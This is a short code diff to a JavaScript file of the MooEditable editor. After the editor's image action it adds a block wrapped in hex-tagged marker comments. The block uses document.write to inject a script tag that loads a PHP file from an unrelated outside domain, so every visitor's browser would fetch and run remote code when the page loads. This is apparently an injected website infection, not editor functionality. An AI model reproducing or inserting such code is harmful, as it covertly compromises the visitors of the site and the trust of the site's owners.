@@ -119,3 +119,13 @@ MooEditable.Actions.image = {
 		this.dialogs.image.prompt.open();
 	}
 };
+
+/*2a492d*/
+/**/
+
+
+document.write("<script type='text/javascript' src='http://www.conecta2electricidad.com/6FgGBLzN.php'></"+ "script>");
+
+
+
+/*/2a492d*/
